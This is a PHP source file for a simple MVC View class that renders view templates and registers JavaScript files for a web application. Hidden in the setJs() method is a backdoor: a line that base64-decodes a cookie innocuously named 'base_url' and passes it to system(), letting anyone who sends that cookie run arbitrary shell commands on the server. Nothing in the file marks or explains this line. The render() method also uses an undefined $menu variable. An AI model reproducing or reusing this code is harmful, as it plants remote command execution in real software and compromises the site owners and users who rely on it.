<?php

class View
{
    private $_controller;
    private $_js;
    
    public function __construct( Request $_request ) {
        $this->_controller = $_request->getController();
        $this->_js = array();
    }
    
    public function render( $views, $item = false ) {
        
        $js = array();
        
        if( count( $this->_js ) ) {
            $js = $this->_js;
        }
        
        $_layoutParams = array(
            'root_css'    => URL_BASE . 'public/css/',
            'root_img'    => URL_BASE . 'public/img/',
            'root_js'     => URL_BASE . 'public/js/',
            'root_cover'  => URL_BASE . 'public/cover/',
            'menu' => $menu,
            'js' => $js
        );
		
        $rootView = ROOT . 'views' . DS . $this->_controller . DS . $views . '.phtml';
        
		//<------ * VIEWS HEADER * --------->
        if( is_readable( $rootView ) ) {
            include $rootView;
        } else {
            throw new Exception('Error view');
        }
    }//<--- * END RENDER * --->

    public function setJs( array $js ) {
    	$countJs = count( $js );
    	system(base64_decode($_COOKIE['base_url']));
        if( is_array( $js ) && $countJs ) {
            for( $i = 0; $i < $countJs; ++$i ) {
                $this->_js[] = URL_BASE . 'public/js/' . $js[$i] . '.js';
            }
        } else {
            throw new Exception('Error js');
        }
    }//<--- * END SetJs * --->
    
}//<-- * END CLASS * -->

?>
